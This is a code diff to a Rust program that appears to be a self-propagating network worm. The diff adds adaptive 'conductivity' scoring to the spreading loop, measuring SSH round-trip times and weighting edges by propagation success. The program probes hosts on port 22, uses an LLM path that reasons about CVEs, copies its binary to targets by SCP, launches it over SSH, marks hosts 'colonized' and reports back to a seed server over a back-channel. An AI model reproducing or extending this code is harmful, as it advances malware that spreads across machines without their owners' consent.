@@ -155,6 +155,14 @@ pub async fn run(mut cli: Cli, sink: Option<std::sync::Arc<GraphSink>>) -> Resul
     });
     let intel = std::sync::Arc::new(intel);
     let mut lineage = init_lineage(&cli)?;
+    match &cli.mode {
+        Mode::Seed => lineage.scoring_mode = cli.scoring_mode,
+        Mode::Propagated if cli.scoring_mode == crate::scoring::ScoringMode::Auto => {
+            cli.scoring_mode = lineage.scoring_mode;
+        }
+        Mode::Propagated => lineage.scoring_mode = cli.scoring_mode,
+        Mode::KeygenTest => {}
+    }
     // Embed ports so propagated hops can call back.
     // server_port → browser HTTP (legacy /report-colonization fallback)
     // mtls_port   → mTLS back-channel on server_port + 1 (Issue #189)
@@ -200,6 +208,7 @@ pub async fn run(mut cli: Cli, sink: Option<std::sync::Arc<GraphSink>>) -> Resul
 
     tracing::info!(
         mode                 = ?cli.mode,
+        scoring_mode         = %lineage.scoring_mode,
         hops                 = lineage.hops,
         origin               = %lineage.origin,
         path                 = ?lineage.path,
@@ -217,6 +226,10 @@ pub async fn run(mut cli: Cli, sink: Option<std::sync::Arc<GraphSink>>) -> Resul
                 depth: (lineage.hops as u32).saturating_add(1),
                 confidence: 0.9,
                 cve_ids: vec![],
+                conductivity: None,
+                q_ema: None,
+                scoring_observations: None,
+                scoring_mode: None,
             };
             fire_back_channel(report, &lineage).await;
         }
@@ -393,7 +406,7 @@ async fn handle_candidate(
 
     // ── Path A: LLM reasoning (all stimuli when LLM is configured) ────────
     if let Some(cfg) = llm {
-        match llm_loop::run(
+        let outcome = llm_loop::run(
             src_ip,
             stimulus,
             lineage,
@@ -402,11 +415,19 @@ async fn handle_candidate(
             intel,
             local_ip,
         )
-        .await?
-        {
-            LlmOutcome::Propagated { confidence, cve } => {
+        .await?;
+
+        match outcome {
+            LlmOutcome::Propagated {
+                confidence,
+                cve,
+                avg_rtt_ms,
+            } => {
                 tracing::info!(%src_ip, "LLM propagation succeeded");
                 let depth = lineage.hops as u32 + 1;
+                let scoring =
+                    lineage.observe_edge(&parent_ip, &ip_str, 1.0, avg_rtt_ms, confidence);
+                log_scoring_update(&parent_ip, &ip_str, avg_rtt_ms, scoring);
                 if let Some(s) = sink {
                     // Seed path: update the organism graph immediately.
                     s.emit(EventKind::EdgeAdded {
@@ -421,12 +442,10 @@ async fn handle_candidate(
                         cve: cve.clone(),
                     })
                     .await;
-                    // Phase 1 D_ij approximation: use LLM confidence directly.
-                    // True reinforcement (Phase 2) requires the back-channel from Issue #179.
                     s.emit(EventKind::DijUpdated {
                         from: parent_ip.clone(),
                         to: ip_str.clone(),
-                        conductivity: confidence,
+                        conductivity: scoring.conductivity,
                     })
                     .await;
                 } else {
@@ -436,6 +455,10 @@ async fn handle_candidate(
                         depth,
                         confidence,
                         cve_ids: cve.into_iter().collect(),
+                        conductivity: Some(scoring.conductivity),
+                        q_ema: Some(scoring.pipeline.q_ema),
+                        scoring_observations: Some(scoring.observations),
+                        scoring_mode: Some(scoring.effective_mode.to_string()),
                     };
                     fire_back_channel(report, lineage).await;
                 }
@@ -443,8 +466,10 @@ async fn handle_candidate(
                 lineage.save()?;
                 return Ok(());
             }
-            LlmOutcome::DeadEnd => {
+            LlmOutcome::DeadEnd { avg_rtt_ms } => {
                 tracing::warn!(%src_ip, "LLM exhausted — marking dead end");
+                let scoring = lineage.observe_edge(&parent_ip, &ip_str, 0.0, avg_rtt_ms, 0.05);
+                log_scoring_update(&parent_ip, &ip_str, avg_rtt_ms, scoring);
                 if let Some(s) = sink {
                     s.emit(EventKind::EdgeAdded {
                         from: parent_ip.clone(),
@@ -454,7 +479,7 @@ async fn handle_candidate(
                     s.emit(EventKind::DijUpdated {
                         from: parent_ip.clone(),
                         to: ip_str.clone(),
-                        conductivity: 0.05,
+                        conductivity: scoring.conductivity,
                     })
                     .await;
                 }
@@ -467,12 +492,29 @@ async fn handle_candidate(
 
     // ── Path B: SSH fallback (no LLM) ─────────────────────────────────────
     tracing::info!(%src_ip, stimulus, "confirming SSH on port 22 (no LLM configured)");
-    if !port_22_open(src_ip).await {
+    let observation_started = std::time::Instant::now();
+    let Some(avg_rtt_ms) = port_22_rtt_ms(src_ip).await else {
         tracing::warn!(%src_ip, "port 22 not open — dead end");
+        let observation_latency_ms = observation_started.elapsed().as_secs_f64() * 1_000.0;
+        let scoring = lineage.observe_edge(&parent_ip, &ip_str, 0.0, observation_latency_ms, 0.05);
+        log_scoring_update(&parent_ip, &ip_str, observation_latency_ms, scoring);
+        if let Some(s) = sink {
+            s.emit(EventKind::EdgeAdded {
+                from: parent_ip.clone(),
+                to: ip_str.clone(),
+            })
+            .await;
+            s.emit(EventKind::DijUpdated {
+                from: parent_ip.clone(),
+                to: ip_str.clone(),
+                conductivity: scoring.conductivity,
+            })
+            .await;
+        }
         lineage.mark_dead_end(&ip_str);
         lineage.save()?;
         return Ok(());
-    }
+    };
 
     crate::discovery::scan_targeted(src_ip);
 
@@ -484,6 +526,9 @@ async fn handle_candidate(
     match propagation::propagate(src_ip, binary_path, &next_b64).await? {
         Outcome::Success => {
             tracing::info!(%src_ip, hops = next_lineage.hops, "propagation success");
+            let mut next_lineage = next_lineage;
+            let scoring = next_lineage.observe_edge(&parent_ip, &ip_str, 1.0, avg_rtt_ms, 0.5);
+            log_scoring_update(&parent_ip, &ip_str, avg_rtt_ms, scoring);
             if let Some(s) = sink {
                 let from = lineage
                     .path
@@ -500,6 +545,12 @@ async fn handle_candidate(
                     depth: next_lineage.hops as u32,
                     confidence: 0.0,
                     cve: None,
+                })
+                .await;
+                s.emit(EventKind::DijUpdated {
+                    from,
+                    to: ip_str.clone(),
+                    conductivity: scoring.conductivity,
                 })
                 .await;
             }
@@ -520,23 +571,58 @@ async fn handle_candidate(
                 })
                 .await;
             }
+            let scoring = lineage.observe_edge(&parent_ip, &ip_str, 1.0, avg_rtt_ms, 0.5);
+            log_scoring_update(&parent_ip, &ip_str, avg_rtt_ms, scoring);
+            if let Some(s) = sink {
+                s.emit(EventKind::DijUpdated {
+                    from: parent_ip.clone(),
+                    to: ip_str.clone(),
+                    conductivity: scoring.conductivity,
+                })
+                .await;
+            }
             lineage.mark_colonized(&ip_str);
             lineage.add_secondary_conduit(&from, &ip_str);
             lineage.save()?;
         }
         Outcome::ScpFailed => {
             tracing::warn!(%src_ip, "SCP failed — dead end");
+            let scoring = lineage.observe_edge(&parent_ip, &ip_str, 0.0, avg_rtt_ms, 0.05);
+            log_scoring_update(&parent_ip, &ip_str, avg_rtt_ms, scoring);
             lineage.mark_dead_end(&ip_str);
             lineage.save()?;
         }
         Outcome::SshFailed => {
             tracing::warn!(%src_ip, "SSH launch failed — penalizing edge");
+            let scoring = lineage.observe_edge(&parent_ip, &ip_str, 0.0, avg_rtt_ms, 0.05);
+            log_scoring_update(&parent_ip, &ip_str, avg_rtt_ms, scoring);
             lineage.penalize(&ip_str);
             lineage.save()?;
         }
     }
 
     Ok(())
+}
+
+fn log_scoring_update(
+    from: &str,
+    to: &str,
+    observation_latency_ms: f64,
+    update: crate::scoring::RuntimeScoringUpdate,
+) {
+    tracing::info!(
+        from,
+        to,
+        requested_mode = %update.requested_mode,
+        effective_mode = %update.effective_mode,
+        observations = update.observations,
+        q_ij = update.pipeline.q_ij,
+        q_ema = update.pipeline.q_ema,
+        d_ij = update.pipeline.d_ij,
+        conductivity = update.conductivity,
+        observation_latency_ms,
+        "adaptive edge scoring updated"
+    );
 }
 
 /// Send a `ColonizationReport` to the seed's HTTP server.
@@ -666,19 +752,21 @@ fn resolve_local_ip(cli: &Cli, _lineage: &Lineage) -> Option<Ipv4Addr> {
 
 /// TCP connect probe — confirms port 22 is open and accepting connections.
 /// Used only in the SSH fallback path (no LLM configured).
-async fn port_22_open(ip: Ipv4Addr) -> bool {
+async fn port_22_rtt_ms(ip: Ipv4Addr) -> Option<f64> {
+    let started = std::time::Instant::now();
     match timeout(Duration::from_secs(5), TcpStream::connect((ip, 22u16))).await {
         Ok(Ok(_)) => {
-            tracing::debug!(%ip, "port 22 open");
-            true
+            let rtt_ms = started.elapsed().as_secs_f64() * 1_000.0;
+            tracing::debug!(%ip, rtt_ms, "port 22 open");
+            Some(rtt_ms)
         }
         Ok(Err(e)) => {
             tracing::debug!(%ip, error = %e, "port 22 refused");
-            false
+            None
         }
         Err(_) => {
             tracing::debug!(%ip, "port 22 timeout");
-            false
+            None
         }
     }
 }
